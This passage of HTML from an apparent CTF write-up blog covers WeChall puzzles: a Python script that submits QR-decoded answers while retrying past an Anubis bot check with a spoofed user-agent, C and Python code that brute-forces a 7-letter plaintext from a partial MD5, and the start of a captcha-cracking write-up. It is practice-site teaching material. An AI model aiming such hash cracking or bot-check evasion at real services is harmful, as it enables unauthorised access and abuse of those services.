class="line"><span class="string">&quot;&quot;&quot;WeChall Inka fast submit: GET painting -&gt; decode QR -&gt; POST answer within limit.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re, subprocess, sys, time</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> zxingcpp <span class="keyword">import</span> read_barcode</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://www.wechall.net/challenge/inka/inka.php&#x27;</span></span><br><span class="line">JAR = <span class="string">&#x27;/tmp/anubis_inka_jar.txt&#x27;</span>             <span class="comment"># anubis cookie jar</span></span><br><span class="line">WC = <span class="string">&#x27;WC=&lt;your-session-cookie&gt;&#x27;</span></span><br><span class="line">UA = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.run([<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--max-time&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, JAR, <span class="string">&#x27;-b&#x27;</span>, WC,</span><br><span class="line">                           <span class="string">&#x27;-A&#x27;</span>, UA, <span class="string">&#x27;-H&#x27;</span>, <span class="string">f&#x27;Referer: <span class="subst">&#123;URL.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>]&#125;</span>/index.php&#x27;</span>, url],</span><br><span class="line">                          capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_qr</span>(<span class="params">A, B, C</span>):</span><br><span class="line">    N = <span class="built_in">int</span>(A, <span class="number">2</span>) * <span class="built_in">int</span>(B, <span class="number">2</span>) + <span class="built_in">int</span>(C, <span class="number">2</span>)</span><br><span class="line">    s = <span class="built_in">bin</span>(N)[<span class="number">2</span>:].rjust(<span class="number">625</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    mat = np.array([[<span class="number">1</span> <span class="keyword">if</span> c == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> c <span class="keyword">in</span> s[i * <span class="number">25</span>:(i + <span class="number">1</span>) * <span class="number">25</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)], dtype=np.uint8)</span><br><span class="line">    img = np.pad(<span class="number">255</span> - mat * <span class="number">255</span>, <span class="number">4</span>, constant_values=<span class="number">255</span>)  <span class="comment"># 1=white, quiet zone</span></span><br><span class="line">    res = read_barcode(img)</span><br><span class="line">    <span class="keyword">return</span> res.text <span class="keyword">if</span> res <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    body = curl(URL)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Making sure&#x27;</span> <span class="keyword">in</span> body <span class="keyword">or</span> <span class="keyword">not</span> body:</span><br><span class="line">        time.sleep(<span class="number">2</span>); <span class="keyword">continue</span>               <span class="comment"># anubis 挡，重试</span></span><br><span class="line">    A, B, C = re.findall(<span class="string">r&#x27;[01]+&#x27;</span>, body.strip())</span><br><span class="line">    ans = decode_qr(A, B, C)</span><br><span class="line">    resp = curl(<span class="string">f&#x27;<span class="subst">&#123;URL&#125;</span>?answer=<span class="subst">&#123;ans&#125;</span>&#x27;</span>) <span class="keyword">if</span> ans <span class="keyword">else</span> <span class="string">&#x27;DECODE FAIL&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;attempt&#125;</span>] answer=<span class="subst">&#123;ans&#125;</span> | resp: <span class="subst">&#123;resp[:<span class="number">120</span>].strip()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;slow&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp <span class="keyword">and</span> <span class="string">&#x27;DECODE FAIL&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-md5-broken/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-md5-broken/" class="post-title-link" itemprop="url">WeChall - MD5 Broken</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-08-17 11:27:52" itemprop="dateCreated datePublished" datetime="2026-08-17T11:27:52+08:00">2026-08-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 09:54:44" itemprop="dateModified" datetime="2026-09-15T09:54:44+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-md5-broken/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-md5-broken/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>MD5 Broken (Cracking, Coding) by gizmore 每个字节缺一个 nibble 的部分
-MD5，暴力破解 7 位小写字母明文</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>题面给出一串 16 个 hex 字符（= 16 字节 MD5，每字节只显示一个
-nibble）， 明文是 7 位小写字母。显示的 hash "bound to your
-session"，每次新登录 session 会重新随机选择每个字节显示高/低哪个
-nibble，但底层答案不变。</p>
-<h3 id="solution">Solution</h3>
-<p>暴力破解 26^7 = 8,031,810,176 个组合，对每个候选算 MD5，检查 16 个
-nibble 是否全部落在"高/低 nibble"集合内。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 7              <span class="comment">/* 明文长度 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTES 16           <span class="comment">/* MD5 字节数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL 8031810176LL <span class="comment">/* 26^7 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> partial[BYTES];  <span class="comment">/* 每字节显示的高/低 nibble 值 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">atomic_int</span> found = <span class="number">0</span>;    <span class="comment">/* 全局找到标志 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> answer[LEN + <span class="number">1</span>];    <span class="comment">/* 找到的明文 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> nthreads = <span class="number">1</span>;       <span class="comment">/* 线程数 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算 MD5，结果写入 out[16] */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">md5_digest</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *msg, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">char</span> out[<span class="number">16</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    EVP_MD_CTX *ctx = EVP_MD_CTX_new();</span><br><span class="line">    EVP_DigestInit_ex(ctx, EVP_md5(), <span class="literal">NULL</span>);</span><br><span class="line">    EVP_DigestUpdate(ctx, msg, len);</span><br><span class="line">    EVP_DigestFinal_ex(ctx, out, <span class="literal">NULL</span>);</span><br><span class="line">    EVP_MD_CTX_free(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查一个候选明文：MD5 的每个字节，高或低 nibble 必须命中 partial */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">matches</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *digest)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; BYTES; i++) &#123;</span><br><span class="line">        <span class="type">uint8_t</span> hi = digest[i] &gt;&gt; <span class="number">4</span>, lo = digest[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">        <span class="keyword">if</span> (partial[i] != hi &amp;&amp; partial[i] != lo)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">worker</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> tid = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 范围均分: [start, end) */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> per = TOTAL / nthreads;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> start = tid * per;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> end = (tid == nthreads - <span class="number">1</span>) ? TOTAL : start + per;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cand[LEN], digest[BYTES];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> k = start; k &lt; end; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;found))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/* 每 1 亿个打一次进度 */</span></span><br><span class="line">        <span class="keyword">if</span> ((k - start) % <span class="number">100000000</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  Thread %ld: %lld / %lld (%.1f%%)\n&quot;</span>,</span><br><span class="line">                   tid, k - start, per, <span class="number">100.0</span> * (k - start) / per);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* base-26 展开为 7 个小写字母 */</span></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> v = k;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LEN - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            cand[i] = <span class="string">&#x27;a&#x27;</span> + (v % <span class="number">26</span>);</span><br><span class="line">            v /= <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        md5_digest(cand, LEN, digest);</span><br><span class="line">        <span class="keyword">if</span> (matches(digest)) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(answer, cand, LEN);</span><br><span class="line">            answer[LEN] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="type">atomic_store</span>(&amp;found, <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;FOUND: %s\n&quot;</span>, answer);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;partial_hex&gt; [threads]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != BYTES) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;partial must be %d hex chars\n&quot;</span>, BYTES);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; BYTES; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c = argv[<span class="number">1</span>][i];</span><br><span class="line">        <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;9&#x27;</span>) partial[i] = c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;f&#x27;</span>) partial[i] = c - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;F&#x27;</span>) partial[i] = c - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid hex char: %c\n&quot;</span>, c); <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    nthreads = argc &gt; <span class="number">2</span> ? atol(argv[<span class="number">2</span>]) : <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (nthreads &lt; <span class="number">1</span>) nthreads = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Starting brute force: %lld combinations across %ld threads\n&quot;</span>, TOTAL, nthreads);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Partial hash: %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> *th = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">pthread_t</span>) * nthreads);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> t = <span class="number">0</span>; t &lt; nthreads; t++)</span><br><span class="line">        pthread_create(&amp;th[t], <span class="literal">NULL</span>, worker, (<span class="type">void</span> *)t);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> t = <span class="number">0</span>; t &lt; nthreads; t++)</span><br><span class="line">        pthread_join(th[t], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;found))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ANSWER: %s\n&quot;</span>, answer);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;NOT FOUND in range\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Python 参考实现</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matches</span>(<span class="params">md5_hex: <span class="built_in">str</span>, partial: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;partial: 16 个 nibble，每字节显示高或低 nibble&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        bv = <span class="built_in">int</span>(md5_hex[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        pn = <span class="built_in">int</span>(partial[i], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> pn != ((bv &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>) <span class="keyword">and</span> pn != (bv &amp; <span class="number">0xF</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">start: <span class="built_in">int</span>, end: <span class="built_in">int</span>, partial: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;按字典序索引 [start, end) 搜索 7 位小写字母明文&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        v = k</span><br><span class="line">        chars = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            chars.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + v % <span class="number">26</span>))</span><br><span class="line">            v //= <span class="number">26</span></span><br><span class="line">        cand = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(chars))</span><br><span class="line">        <span class="keyword">if</span> matches(hashlib.md5(cand.encode()).hexdigest(), partial):</span><br><span class="line">            <span class="keyword">return</span> cand</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    partial = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;3a45b89f570f5527&quot;</span></span><br><span class="line">    start = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    end = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">3</span> <span class="keyword">else</span> <span class="number">26</span> ** <span class="number">7</span></span><br><span class="line">    ans = crack(start, end, partial)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ANSWER: <span class="subst">&#123;ans&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-crackcha/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-crackcha/" class="post-title-link" itemprop="url">WeChall - Crackcha</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-08-17 10:54:07" itemprop="dateCreated datePublished" datetime="2026-08-17T10:54:07+08:00">2026-08-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 09:52:05" itemprop="dateModified" datetime="2026-09-15T09:52:05+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-crackcha/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-crackcha/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Crackcha 要求在 30 分钟内破解至少 468 个
-<code>WC4_Captcha</code>（在线自动化题，无静态答案）。每次 reset
-开始一个新窗口，<code>problem.php</code> 返回一张 captcha
-图片，<code>answer.php?answer=[letters]</code> 提交答案，答对计数 +1，满
-468 自动通关。没有静态 flag，解法就是写出一个能跑赢 30
-分钟窗口的识别器。</p>
-<h3 id="source-analysis">Source Analysis</h3>
-<p>gwf3 源码 <code>challenge/crackcha/crackcha.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WCC_CRACKCHA_NEED&#x27;</span>, <span class="number">468</span>); <span class="comment"># need to crack 600</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WCC_CRACKCHA_TIME&#x27;</span>, <span class="number">1800</span>); <span class="comment"># within 30 minutes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crackcha_next</span>(<span class="params">WC_Challenge <span class="variable">$chall</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">require_once</span> GWF_CORE_PATH.<span class="string">&#x27;inc/3p/Class_Captcha.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$chars</span> = <span class="title class_">GWF_Random</span>::<span class="title function_ invoke__">randomKey</span>(<span class="number">5</span>, <span class="title class_">GWF_Random</span>::<span class="variable constant_">ALPHAUP</span>);   <span class="comment">// 5 个大写字母</span></span><br><span class="line">	<span class="title function_ invoke__">crackcha_increase_count</span>();</span><br><span class="line">	<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;WCC_CRACKCHA_CHARS&#x27;</span>, <span 